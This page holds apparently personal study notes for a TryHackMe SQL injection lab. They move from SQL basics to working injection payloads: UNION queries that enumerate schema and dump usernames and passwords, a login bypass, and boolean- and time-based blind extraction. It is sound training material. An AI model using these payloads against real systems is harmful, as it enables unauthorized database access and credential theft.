<!doctype html>
<html lang="en" dir="ltr" class="docs-wrapper plugin-docs plugin-id-default docs-version-current docs-doc-page docs-doc-id-Jr Penetration Tester/Introduction to Web Hacking/SQL Injection" data-has-hydrated="false">
<head>
<meta charset="UTF-8">
<meta name="generator" content="Docusaurus v3.2.0">
<title data-rh="true">SQL Injection | THM Notes</title><meta data-rh="true" name="viewport" content="width=device-width,initial-scale=1"><meta data-rh="true" name="twitter:card" content="summary_large_image"><meta data-rh="true" property="og:image" content="https://thm.pochacco.top/img/Pochacco-social-card.png"><meta data-rh="true" name="twitter:image" content="https://thm.pochacco.top/img/Pochacco-social-card.png"><meta data-rh="true" property="og:url" content="https://thm.pochacco.top/docs/Jr Penetration Tester/Introduction to Web Hacking/SQL Injection"><meta data-rh="true" property="og:locale" content="en"><meta data-rh="true" name="docusaurus_locale" content="en"><meta data-rh="true" name="docsearch:language" content="en"><meta data-rh="true" name="docusaurus_version" content="current"><meta data-rh="true" name="docusaurus_tag" content="docs-default-current"><meta data-rh="true" name="docsearch:version" content="current"><meta data-rh="true" name="docsearch:docusaurus_tag" content="docs-default-current"><meta data-rh="true" property="og:title" content="SQL Injection | THM Notes"><meta data-rh="true" name="description" content="SQL (Structured Query Language) Injection, mostly referred to as SQLi, is an attack on a web application database server that causes malicious queries to be executed."><meta data-rh="true" property="og:description" content="SQL (Structured Query Language) Injection, mostly referred to as SQLi, is an attack on a web application database server that causes malicious queries to be executed."><link data-rh="true" rel="icon" href="/img/favicon.ico"><link data-rh="true" rel="canonical" href="https://thm.pochacco.top/docs/Jr Penetration Tester/Introduction to Web Hacking/SQL Injection"><link data-rh="true" rel="alternate" href="https://thm.pochacco.top/docs/Jr Penetration Tester/Introduction to Web Hacking/SQL Injection" hreflang="en"><link data-rh="true" rel="alternate" href="https://thm.pochacco.top/docs/Jr Penetration Tester/Introduction to Web Hacking/SQL Injection" hreflang="x-default"><link rel="stylesheet" href="/assets/css/styles.487c242f.css">
<script src="/assets/js/runtime~main.32f33024.js" defer="defer"></script>
<script src="/assets/js/main.7573ae7a.js" defer="defer"></script>
</head>
<body class="navigation-with-keyboard">
<script>!function(){function t(t){document.documentElement.setAttribute("data-theme",t)}var e=function(){try{return new URLSearchParams(window.location.search).get("docusaurus-theme")}catch(t){}}()||function(){try{return localStorage.getItem("theme")}catch(t){}}();t(null!==e?e:"light")}(),function(){try{const c=new URLSearchParams(window.location.search).entries();for(var[t,e]of c)if(t.startsWith("docusaurus-data-")){var a=t.replace("docusaurus-data-","data-");document.documentElement.setAttribute(a,e)}}catch(t){}}()</script><div id="__docusaurus"><div role="region" aria-label="Skip to main content"><a class="skipToContent_fXgn" href="#__docusaurus_skipToContent_fallback">Skip to main content</a></div><nav aria-label="Main" class="navbar navbar--fixed-top"><div class="navbar__inner"><div class="navbar__items"><button aria-label="Toggle navigation bar" aria-expanded="false" class="navbar__toggle clean-btn" type="button"><svg width="30" height="30" viewBox="0 0 30 30" aria-hidden="true"><path stroke="currentColor" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2" d="M4 7h22M4 15h22M4 23h22"></path></svg></button><a class="navbar__brand" href="/"><div class="navbar__logo"><img src="/img/logo.png" alt="PochaccoTop Logo" class="themedComponent_mlkZ themedComponent--light_NVdE"><img src="/img/logo.png" alt="PochaccoTop Logo" class="themedComponent_mlkZ themedComponent--dark_xIcU"></div><b class="navbar__title text--truncate">TryHackMe Notes</b></a><a aria-current="page" class="navbar__item navbar__link navbar__link--active" href="/docs/Intro">TryHackme</a></div><div class="navbar__items navbar__items--right"><a href="https://index.pochacco.top/en/" target="_blank" rel="noopener noreferrer" class="navbar__item navbar__link">Index<svg width="13.5" height="13.5" aria-hidden="true" viewBox="0 0 24 24" class="iconExternalLink_nPIU"><path fill="currentColor" d="M21 13v10h-21v-19h12v2h-10v15h17v-8h2zm3-12h-10.988l4.035 4-6.977 7.07 2.828 2.828 6.977-7.07 4.125 4.172v-11z"></path></svg></a><a href="https://pochacco.top" target="_blank" rel="noopener noreferrer" class="navbar__item navbar__link">MainSite<svg width="13.5" height="13.5" aria-hidden="true" viewBox="0 0 24 24" class="iconExternalLink_nPIU"><path fill="currentColor" d="M21 13v10h-21v-19h12v2h-10v15h17v-8h2zm3-12h-10.988l4.035 4-6.977 7.07 2.828 2.828 6.977-7.07 4.125 4.172v-11z"></path></svg></a><a href="https://github.com/pikachu233666" target="_blank" rel="noopener noreferrer" class="navbar__item navbar__link header-github-link" aria-label="GitHub repository"></a><div class="toggle_vylO colorModeToggle_DEke"><button class="clean-btn toggleButton_gllP toggleButtonDisabled_aARS" type="button" disabled="" title="Switch between dark and light mode (currently light mode)" aria-label="Switch between dark and light mode (currently light mode)" aria-live="polite"><svg viewBox="0 0 24 24" width="24" height="24" class="lightToggleIcon_pyhR"><path fill="currentColor" d="M12,9c1.65,0,3,1.35,3,3s-1.35,3-3,3s-3-1.35-3-3S10.35,9,12,9 M12,7c-2.76,0-5,2.24-5,5s2.24,5,5,5s5-2.24,5-5 S14.76,7,12,7L12,7z M2,13l2,0c0.55,0,1-0.45,1-1s-0.45-1-1-1l-2,0c-0.55,0-1,0.45-1,1S1.45,13,2,13z M20,13l2,0c0.55,0,1-0.45,1-1 s-0.45-1-1-1l-2,0c-0.55,0-1,0.45-1,1S19.45,13,20,13z M11,2v2c0,0.55,0.45,1,1,1s1-0.45,1-1V2c0-0.55-0.45-1-1-1S11,1.45,11,2z M11,20v2c0,0.55,0.45,1,1,1s1-0.45,1-1v-2c0-0.55-0.45-1-1-1C11.45,19,11,19.45,11,20z M5.99,4.58c-0.39-0.39-1.03-0.39-1.41,0 c-0.39,0.39-0.39,1.03,0,1.41l1.06,1.06c0.39,0.39,1.03,0.39,1.41,0s0.39-1.03,0-1.41L5.99,4.58z M18.36,16.95 c-0.39-0.39-1.03-0.39-1.41,0c-0.39,0.39-0.39,1.03,0,1.41l1.06,1.06c0.39,0.39,1.03,0.39,1.41,0c0.39-0.39,0.39-1.03,0-1.41 L18.36,16.95z M19.42,5.99c0.39-0.39,0.39-1.03,0-1.41c-0.39-0.39-1.03-0.39-1.41,0l-1.06,1.06c-0.39,0.39-0.39,1.03,0,1.41 s1.03,0.39,1.41,0L19.42,5.99z M7.05,18.36c0.39-0.39,0.39-1.03,0-1.41c-0.39-0.39-1.03-0.39-1.41,0l-1.06,1.06 c-0.39,0.39-0.39,1.03,0,1.41s1.03,0.39,1.41,0L7.05,18.36z"></path></svg><svg viewBox="0 0 24 24" width="24" height="24" class="darkToggleIcon_wfgR"><path fill="currentColor" d="M9.37,5.51C9.19,6.15,9.1,6.82,9.1,7.5c0,4.08,3.32,7.4,7.4,7.4c0.68,0,1.35-0.09,1.99-0.27C17.45,17.19,14.93,19,12,19 c-3.86,0-7-3.14-7-7C5,9.07,6.81,6.55,9.37,5.51z M12,3c-4.97,0-9,4.03-9,9s4.03,9,9,9s9-4.03,9-9c0-0.46-0.04-0.92-0.1-1.36 c-0.98,1.37-2.58,2.26-4.4,2.26c-2.98,0-5.4-2.42-5.4-5.4c0-1.81,0.89-3.42,2.26-4.4C12.92,3.04,12.46,3,12,3L12,3z"></path></svg></button></div><div class="navbarSearchContainer_Bca1"></div></div></div><div role="presentation" class="navbar-sidebar__backdrop"></div></nav><div id="__docusaurus_skipToContent_fallback" class="main-wrapper mainWrapper_z2l0"><div class="docsWrapper_hBAB"><button aria-label="Scroll back to top" class="clean-btn theme-back-to-top-button backToTopButton_sjWU" type="button"></button><div class="docRoot_UBD9"><aside class="theme-doc-sidebar-container docSidebarContainer_YfHR"><div class="sidebarViewport_aRkj"><div class="sidebar_njMd"><nav aria-label="Docs sidebar" class="menu thin-scrollbar menu_SIkG"><ul class="theme-doc-sidebar-menu menu__list"><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-1 menu__list-item"><a class="menu__link" href="/docs/Intro">TryHackMe</a></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-1 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--sublist-caret" role="button" aria-expanded="false" href="/docs/Introduction to Cyber Security/Introduction to Cyber Security/Careers in Cyber">Introduction to Cyber Security</a></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-1 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--sublist-caret" role="button" aria-expanded="false" href="/docs/Introduction to Cyber Security/Introduction to Cyber Security/Careers in Cyber">Pre Security</a></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-1 menu__list-item"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--sublist-caret menu__link--active" role="button" aria-expanded="true" href="/docs/Introduction to Cyber Security/Introduction to Cyber Security/Careers in Cyber">Jr Penetration Tester</a></div><ul style="display:block;overflow:visible;height:auto" class="menu__list"><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--sublist-caret" role="button" aria-expanded="false" tabindex="0" href="/docs/Introduction to Cyber Security/Introduction to Cyber Security/Careers in Cyber">Introduction to Cyber Security</a></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--sublist-caret" role="button" aria-expanded="false" tabindex="0" href="/docs/Jr Penetration Tester/Introduction to Pentesting/Pentesting Fundamentals">Introduction to Pentesting</a></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--sublist-caret menu__link--active" role="button" aria-expanded="true" tabindex="0" href="/docs/Jr Penetration Tester/Introduction to Web Hacking/Authentication Bypass">Introduction to Web Hacking</a></div><ul style="display:block;overflow:visible;height:auto" class="menu__list"><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link" tabindex="0" href="/docs/Jr Penetration Tester/Introduction to Web Hacking/Authentication Bypass">Authentication Bypass</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link" tabindex="0" href="/docs/Jr Penetration Tester/Introduction to Web Hacking/Command Injection">Command Injection</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link" tabindex="0" href="/docs/Jr Penetration Tester/Introduction to Web Hacking/Content Discovery">Content Discovery</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link" tabindex="0" href="/docs/Jr Penetration Tester/Introduction to Web Hacking/Cross-site Scripting">Cross-site Scripting</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link" tabindex="0" href="/docs/Jr Penetration Tester/Introduction to Web Hacking/File Inclusion">File Inclusion</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link" tabindex="0" href="/docs/Jr Penetration Tester/Introduction to Web Hacking/IDOR">IDOR</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link" tabindex="0" href="/docs/Jr Penetration Tester/Introduction to Web Hacking/Intro to SSRF">Intro to SSRF</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link menu__link--active" aria-current="page" tabindex="0" href="/docs/Jr Penetration Tester/Introduction to Web Hacking/SQL Injection">SQL Injection</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link" tabindex="0" href="/docs/Jr Penetration Tester/Introduction to Web Hacking/Subdomain Enumeration">Subdomain Enumeration</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link" tabindex="0" href="/docs/Jr Penetration Tester/Introduction to Web Hacking/Walking An Application">Walking An Application</a></li></ul></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--sublist-caret" role="button" aria-expanded="false" tabindex="0" href="/docs/Jr Penetration Tester/Burp Suite/Extensions">Burp Suite</a></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--sublist-caret" role="button" aria-expanded="false" tabindex="0" href="/docs/Jr Penetration Tester/Network Security/Active Reconnaissance">Network Security</a></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--sublist-caret" role="button" aria-expanded="false" tabindex="0" href="/docs/Jr Penetration Tester/Vulnerability Research/Exploit Vulnerabilities">Vulnerability Research</a></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--sublist-caret" role="button" aria-expanded="false" tabindex="0" href="/docs/Jr Penetration Tester/Metasploit/Exploitation">Metasploit</a></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--sublist-caret" role="button" aria-expanded="false" tabindex="0" href="/docs/Jr Penetration Tester/Privilege Escalation/Linux Privilege Escalation">Privilege Escalation</a></div></li></ul></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-1 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--sublist-caret" role="button" aria-expanded="false" href="/docs/Events/The Witch&#x27;s Cauldron">Events</a></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-1 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--sublist-caret" role="button" aria-expanded="false" href="/docs/Others/Bash Scripting">Others</a></div></li></ul></nav></div></div></aside><main class="docMainContainer_TBSr"><div class="container padding-top--md padding-bottom--lg"><div class="row"><div class="col docItemCol_VOVn"><div class="docItemContainer_Djhp"><article><nav class="theme-doc-breadcrumbs breadcrumbsContainer_Z_bl" aria-label="Breadcrumbs"><ul class="breadcrumbs" itemscope="" itemtype="https://schema.org/BreadcrumbList"><li class="breadcrumbs__item"><a aria-label="Home page" class="breadcrumbs__link" href="/"><svg viewBox="0 0 24 24" class="breadcrumbHomeIcon_YNFT"><path d="M10 19v-5h4v5c0 .55.45 1 1 1h3c.55 0 1-.45 1-1v-7h1.7c.46 0 .68-.57.33-.87L12.67 3.6c-.38-.34-.96-.34-1.34 0l-8.36 7.53c-.34.3-.13.87.33.87H5v7c0 .55.45 1 1 1h3c.55 0 1-.45 1-1z" fill="currentColor"></path></svg></a></li><li class="breadcrumbs__item"><span class="breadcrumbs__link">Jr Penetration Tester</span><meta itemprop="position" content="1"></li><li class="breadcrumbs__item"><span class="breadcrumbs__link">Introduction to Web Hacking</span><meta itemprop="position" content="2"></li><li itemscope="" itemprop="itemListElement" itemtype="https://schema.org/ListItem" class="breadcrumbs__item breadcrumbs__item--active"><span class="breadcrumbs__link" itemprop="name">SQL Injection</span><meta itemprop="position" content="3"></li></ul></nav><div class="tocCollapsible_ETCw theme-doc-toc-mobile tocMobile_ITEo"><button type="button" class="clean-btn tocCollapsibleButton_TO0P">On this page</button></div><div class="theme-doc-markdown markdown"><p>#Web</p>
<p>SQL (Structured Query Language) Injection, mostly referred to as SQLi, is an attack on a web application database server that causes malicious queries to be executed.</p>
<h1>Database</h1>
<p>Database:
A database is a way of electronically storing collections of data in an organised manner. A database is controlled by a DBMS which is an acronym for  Database Management System, DBMS&#x27;s fall into two camps <strong>Relational</strong> or <strong>Non-Relational</strong>, some common one&#x27;s are MySQL, Microsoft SQL Server, Access, PostgreSQL and SQLite.</p>
<p>Within a DBMS, you can have multiple databases, each containing its own set of related data. In the database you can store information separately in the database using something called tables, the tables are identified with a unique name for each one. You can see this structure in the diagram below.</p>
<p><img decoding="async" loading="lazy" alt="SQL_Injection_1" src="/assets/images/SQL_Injection_1-c19691b965cd394bc880a120fff3c166.png" width="841" height="411" class="img_ev3q"></p>
<p>Table:</p>
<p><img decoding="async" loading="lazy" alt="SQL_Injection_2" src="/assets/images/SQL_Injection_2-2ebe4279421978ef0eedb1c032745cc5.png" width="1255" height="268" class="img_ev3q"></p>
<p><strong>Columns:</strong>
Each column, better referred to as a field has a unique name per table. When creating a column, you also set the type of data it will contain, common ones being integer (numbers), strings (standard text) or dates. Some databases can contain much more complex data, such as geospatial, which contains location information. Setting the data type also ensures that incorrect information isn&#x27;t stored. If this happens, the database server will usually produce an error message. A column containing an integer can also have an auto-increment feature enabled; this gives each row of data a unique number that grows (increments) with each subsequent row, doing so creates what is called a <strong>key</strong> field, a key field has to be unique for every row of data which can be used to find that exact row in SQL queries.</p>
<p><strong>Rows:</strong>
Rows or records are what contains the individual lines of data. When you add data to the table, a new row/record is created, and when you delete data, a row/record is removed.</p>
<p><strong>Relational Vs Non-Relational Databases:</strong><br>
<!-- -->A relational database, stores information in tables and often the tables have shared information between them, they use columns to specify and define the data being stored and rows to actually store the data. The tables will often contain a column that has a unique ID (primary key) which will then be used in other tables to reference it and cause a relationship between the tables, hence the name <strong>relational</strong> database.</p>
<p>Non-relational databases sometimes called NoSQL on the other hand is any sort of database that doesn&#x27;t use tables, columns and rows to store the data, a specific database layout doesn&#x27;t need to be constructed so each row of data can contain different information which can give more flexibility over a relational database.  Some popular databases of this type are MongoDB, Cassandra and ElasticSearch.</p>
<h1>SQL</h1>
<p>SQL (Structured Query Language) is a feature-rich language used for querying databases, these SQL queries are better referred to as statements.</p>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="select">SELECT<a href="#select" class="hash-link" aria-label="Direct link to SELECT" title="Direct link to SELECT">​</a></h2>
<p>It is used to retrieve data from the database.</p>
<p><code>select * from users;</code>
<code>select</code> : retrieve some data
<code>*</code> : receive back all columns from the table
<code>from users</code> : retrieve the data from the table named users
<code>;</code> : it is the end of the query</p>
<p><code>select username,password from users;</code>
It just requesting the username and password field.</p>
<p><code>select * from users LIMIT 1;</code>
By using the <code>LIMIT</code> clause, the first number tells the database how many results you wish to skip, and the second number tells the database how many rows to return.</p>
<p><code>select * from users where username=&#x27;admin&#x27;;</code>
<code>select * from users where username != &#x27;admin&#x27;;</code>
<code>select * from users where username=&#x27;admin&#x27; or username=&#x27;jon&#x27;;</code>
<code>select * from users where username=&#x27;admin&#x27; and password=&#x27;p4ssword&#x27;;</code>
By using <code>where</code> clause, can return specific clauses.</p>
<p><code>select * from users where username like &#x27;a%&#x27;;</code>
<code>select * from users where username like &#x27;%n&#x27;;</code>
<code>select * from users where username like &#x27;%mi%&#x27;;</code>
Using the <code>like</code> clause allows you to specify data that isn&#x27;t an exact match but instead either starts, contains or ends with certain characters by choosing where to place the wildcard character represented by a percentage sign %.</p>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="union">UNION<a href="#union" class="hash-link" aria-label="Direct link to UNION" title="Direct link to UNION">​</a></h2>
<p>It combines the results of two or more SELECT statements to retrieve data from either single or multiple tables.
The rules to this query are that the UNION statement must retrieve the same number of columns in each SELECT statement, the columns have to be of a similar data type and the column order has to be the same.</p>
<p><code>SELECT name,address,city,postcode from customers UNION SELECT company,address,city,postcode from suppliers;</code></p>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="insert">INSERT<a href="#insert" class="hash-link" aria-label="Direct link to INSERT" title="Direct link to INSERT">​</a></h2>
<p>It inserts a new row of data into the table.</p>
<p><code>insert into users (username,password) values (&#x27;bob&#x27;,&#x27;password123&#x27;);</code>
<code>into users</code> tells the database which table we wish to insert the data into <code>(username,password)</code> provides the columns we are providing data for values <code>(&#x27;bob&#x27;,&#x27;password&#x27;);</code>  provides the data for the previously specified columns.</p>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="update">UPDATE<a href="#update" class="hash-link" aria-label="Direct link to UPDATE" title="Direct link to UPDATE">​</a></h2>
<p>It updates one or more rows of data within a table.</p>
<p><code>update users SET username=&#x27;root&#x27;,password=&#x27;pass123&#x27; where username=&#x27;admin&#x27;;</code>
You specify the table you wish to update using <code>update %tablename% SET</code> and then select the field or fields you wish to update as a comma-separated list such as <code>username=&#x27;root&#x27;,password=&#x27;pass123&#x27;</code> then finally similar to the SELECT statement, you can specify exactly which rows to update using the where clause such as <code>where username=&#x27;admin;</code>.</p>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="delete">DELETE<a href="#delete" class="hash-link" aria-label="Direct link to DELETE" title="Direct link to DELETE">​</a></h2>
<p>It deletes one or more rows of data.</p>
<p><code>delete from users where username=&#x27;martin&#x27;;</code>
You can specify precisely which data to delete using the <strong>where</strong> clause and the number of rows to be deleted using the <strong>LIMIT</strong> clause.</p>
<p><code>delete from users;</code>
All the data is deleted in the table.</p>
<h1>SQL Injection</h1>
<p>It happens when user-provided data gets included in the SQL query.</p>
<p>Three types of SQL Injection:</p>
<ul>
<li>In-Band SQLi</li>
<li>Blind SQLi</li>
<li>Out-of-Band SQLi</li>
</ul>
<p>Example:
The common entry of a blog:
<code>https://website.thm/blog?id=1</code></p>
<p>The SQL statement behind it:
<code>SELECT * from blog where id=1 and private=0 LIMIT 1;</code></p>
<p>Try to call it:
<code>https://website.thm/blog?id=2;--</code></p>
<p>Produce the SQL statement:
<code>SELECT * from blog where id=2;-- and private=0 LIMIT 1;</code></p>
<p>It turns to:
<code>SELECT * from blog where id=2;--</code>
The semicolon in the URL signifies the end of the SQL statement, and the two dashes cause everything afterwards to be treated as a comment</p>
<h1>In-Band SQLi</h1>
<p>In-Band just refers to the same method of communication being used to exploit the vulnerability and also receive the results. For example, discovering an SQL Injection vulnerability on a website page and then being able to extract data from the database to the same page.</p>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="error-based-sql-injection">Error-Based SQL Injection<a href="#error-based-sql-injection" class="hash-link" aria-label="Direct link to Error-Based SQL Injection" title="Direct link to Error-Based SQL Injection">​</a></h2>
<p>This type of SQL Injection is the most useful for easily obtaining information about the database structure as error messages from the database are printed directly to the browser screen. This can often be used to enumerate a whole database.</p>
<p>The key to discovering error-based SQL Injection is to break the code&#x27;s SQL query by trying certain characters until an error message is produced; these are most commonly single apostrophes ( &#x27; ) or a quotation mark ( &quot; ).</p>
<p><code>https://website.thm/article?id=1</code></p>
<p>First, we try how many column it has, input the id as <code>1 UNION SELECT 1,2,3</code></p>
<p>Then, we need the first query to produce no results, this can simply be done by changing the article id from 1 to 0
<code>0 UNION SELECT 1,2,3</code></p>
<p>Get the name of database
<code>0 UNION SELECT 1,2,database()</code></p>
<p>Gather a list of table in the database
<code>0 UNION SELECT 1,2,group_concat(table_name) FROM information_schema.tables WHERE table_schema = &#x27;sqli_one&#x27;</code></p>
<p>Gather the rows where the table_name column has a value of staff_user
<code>0 UNION SELECT 1,2,group_concat(column_name) FROM information_schema.columns WHERE table_name = &#x27;staff_users&#x27;</code></p>
<p>Retrieve the user&#x27;s information
<code>0 UNION SELECT 1,2,group_concat(username,&#x27;:&#x27;,password SEPARATOR &#x27;&lt;br&gt;&#x27;) FROM staff_users</code>
We use <code>:</code> to split the username and password and use HTML <code>&lt;br&gt;</code> tag that forces each result to be on a separate line.</p>
<p><code>group_contact()</code> gets the specified column from multiple returned rows and puts it into one string separated by commas.
<code>information_schema</code> database contains information about all the databases and tables the user have access to.
<code>table_name</code> : the name of table
<code>table_schema</code> : the table of database</p>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="union-based-sql-injection">Union-Based SQL Injection<a href="#union-based-sql-injection" class="hash-link" aria-label="Direct link to Union-Based SQL Injection" title="Direct link to Union-Based SQL Injection">​</a></h2>
<p>This type of Injection utilises the SQL UNION operator alongside a SELECT statement to return additional results to the page. This method is the most common way of extracting large amounts of data via an SQL Injection vulnerability.</p>
<h1>Blind SQLi</h1>
<p>It is when we get little to no feedback to confirm whether our injected queries were, this is because the error messages have been disabled.</p>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="authentication-bypass">Authentication Bypass<a href="#authentication-bypass" class="hash-link" aria-label="Direct link to Authentication Bypass" title="Direct link to Authentication Bypass">​</a></h2>
<p>One of the most straightforward Blind SQL Injection techniques is when bypassing authentication methods such as login forms. The web application is interested in whether the two make a matching pair in the users table.</p>
<p>The SQL Query may like this
<code>select * from users where username=&#x27;%username%&#x27; and password=&#x27;%password%&#x27; LIMIT 1;</code></p>
<p>To make this always be true, we can input
<code>&#x27; OR 1=1;--</code></p>
<p>That change into
<code>select * from users where username=&#x27;&#x27; and password=&#x27;&#x27; OR 1=1;</code></p>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="boolean-based">Boolean Based<a href="#boolean-based" class="hash-link" aria-label="Direct link to Boolean Based" title="Direct link to Boolean Based">​</a></h2>
<p>Boolean based SQL Injection refers to the response we receive back from our injection attempts which could be a true/false, yes/no, on/off, 1/0 or any response which can only ever have two outcomes.</p>
<p>The SQL query just like below
<code>select * from users where username = &#x27;%username%&#x27; LIMIT 1;</code></p>
<p>We can first use UNION to establish the number of columns
<code>admin123&#x27; UNION SELECT 1;--</code></p>
<p>As the web application has responded with the value <strong>taken</strong> as false, we can confirm this is the incorrect value of columns. Keep on adding more columns until we have a <strong>taken</strong> value of <strong>true</strong>.
<code>admin123&#x27; UNION SELECT 1,2,3;--</code></p>
<p>Then we can discovered the database name, we can use the build-in <code>database()</code>method and using the <code>like</code> operator to find the results that return a true status.
<code>admin123&#x27; UNION SELECT 1,2,3 where database() like &#x27;%&#x27;;--</code>
We get a true response because the wildcard <code>%</code> will match anything.</p>
<p>If we change the wildcard operator to <strong>a%</strong>, you&#x27;ll see the response goes back to false, which confirms that the database name does not begin with the letter <strong>a</strong>. We can cycle through all the letters, numbers and characters such as - and _ until we discover a match.
<code>admin123&#x27; UNION SELECT 1,2,3 where database() like &#x27;s%&#x27;;--</code></p>
<p>Now you move onto the next character of the database name until you find another <strong>true</strong> response, for example, &#x27;sa%&#x27;, &#x27;sb%&#x27;, &#x27;sc%&#x27; etc. Keep on with this process until you discover all the characters of the database name.</p>
<p>Next we can enumerate table name using a similar method by utilising the information_schema database.
<code>admin123&#x27; UNION SELECT 1,2,3 FROM information_schema.tables WHERE table_schema = &#x27;sqli_three&#x27; and table_name like &#x27;a%&#x27;;--</code>
Like previously, you&#x27;ll need to cycle through letters, numbers and characters until you find a positive match.</p>
<p>Finally, you can confirm the table you find by running the following username payload
<code>admin123&#x27; UNION SELECT 1,2,3 FROM information_schema.tables WHERE table_schema = &#x27;sqli_three&#x27; and table_name=&#x27;users&#x27;;--</code></p>
<p>Lastly, we need to enumerate the column names in the table so we can property search it for login credentials
<code>admin123&#x27; UNION SELECT 1,2,3 FROM information_schema.COLUMNS WHERE TABLE_SCHEMA=&#x27;sqli_three&#x27; and TABLE_NAME=&#x27;users&#x27; and COLUMN_NAME like &#x27;a%&#x27;;</code></p>
<p>Again you&#x27;ll need to cycle through letters, numbers and characters until you find a match. As you&#x27;re looking for multiple results, you&#x27;ll have to add this to your payload each time you find a new column name, so you don&#x27;t keep discovering the same one. For example, once you&#x27;ve found the column named <strong>id</strong>, you&#x27;ll append that to your original payload
<code>admin123&#x27; UNION SELECT 1,2,3 FROM information_schema.COLUMNS WHERE TABLE_SCHEMA=&#x27;sqli_three&#x27; and TABLE_NAME=&#x27;users&#x27; and COLUMN_NAME like &#x27;a%&#x27; and COLUMN_NAME !=&#x27;id&#x27;;</code></p>
<p>After that, you can query the <strong>users</strong> table for login credentials, first, you need to discover a valid username
<code>admin123&#x27; UNION SELECT 1,2,3 from users where username like &#x27;a%</code></p>
<p>Once you&#x27;ve cycled through all the characters, you will got the username, and you can concentrate on discover the password
<code>admin123&#x27; UNION SELECT 1,2,3 from users where username=&#x27;admin&#x27; and password like &#x27;a%</code></p>
<p>Cycling through all the characters, you&#x27;ll discover the password</p>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="time-based">Time Based<a href="#time-based" class="hash-link" aria-label="Direct link to Time Based" title="Direct link to Time Based">​</a></h2>
<p>It is very similar to the boolean based, the same requests are sent, but there is no visual indicator of your queries being wrong or right. It is based on the time the query takes to complete. The time delay is introduced by using built-in methods such as <code>SLEEP(x)</code> alongside the UNION statement.</p>
<p>For example, when trying to establish the number of columns in a table, you would use the following query.
<code>admin123&#x27; UNION SELECT SLEEP(5);--</code></p>
<p>If there was no pause in the response time, we know that the query was unsuccessful, so like on previous tasks, we add another column.
<code>admin123&#x27; UNION SELECT SLEEP(5),2;--</code>
It provides a 5 seconds time delay.</p>
<h1>Out-of-Band SQLi</h1>
<p>It is not as common as it either depends on specific features being enabled on the database server or the web application&#x27;s business logic, which makes some kind of external network call based on the results from an SQL query.</p>
<p>An Out-Of-Band attack is classified by having two different communication channels, one to launch the attack and the other to gather the results.</p>
<p>For example, the attack channel could be a web request, and the data gathering channel could be monitoring HTTP/DNS requests made to a service you control.</p>
<ol>
<li>An attacker makes a request to a website vulnerable to SQL Injection with an injection payload.</li>
<li>The Website makes an SQL query to the database which also passes the hacker&#x27;s payload.</li>
<li>The payload contains a request which forces an HTTP request back to the hacker&#x27;s machine containing data from the database.</li>
</ol>
